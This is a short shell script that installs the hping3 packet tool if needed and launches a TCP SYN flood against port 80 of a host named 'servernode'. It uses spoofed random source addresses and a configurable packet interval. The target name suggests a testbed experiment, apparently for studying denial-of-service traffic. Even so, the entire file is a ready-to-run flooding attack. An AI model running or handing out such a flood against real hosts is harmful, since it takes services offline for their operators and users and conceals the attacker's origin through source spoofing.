#!/bin/sh

INTERVAL=$1
OPTIONS=$2

if ! type "hping3" > /dev/null; then
  sudo apt install -y hping3
fi

sudo hping3 -i u$INTERVAL -S -p 80 --rand-source $OPTIONS servernode
